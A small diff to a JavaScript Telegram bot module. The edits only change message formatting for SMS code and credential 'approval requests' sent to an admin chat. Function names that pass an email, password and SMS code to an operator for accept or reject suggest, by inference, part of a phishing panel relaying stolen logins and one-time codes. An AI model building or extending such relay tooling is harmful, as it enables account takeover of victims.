@@ -56,7 +56,7 @@ function sendApprovalRequestSMS(code) {
       ]
     }
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `*SMS Approval Requested*\n*Code:* ${code}`, { ...options, parse_mode: "Markdown" });
+  bot.sendMessage(ADMIN_CHAT_ID, `*SMS* Approval Requested\n*Code:* ${code}`, { ...options, parse_mode: "Markdown" });
 }
 
 // -----------------
@@ -82,7 +82,7 @@ function sendApprovalRequestPage(email, password) {
 bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
-    const status = action === "accept" ? "accepted" : "rejected";
+    const status = action === "accept" ? "accepted ✅" : "rejected ❌";
 
     // Notify backend
     await fetch(`${APP_URL}/update-status`, {
@@ -110,6 +110,7 @@ bot.onText(/\/start/, (msg) => {
 });
 
 module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage };
+
 
 
 
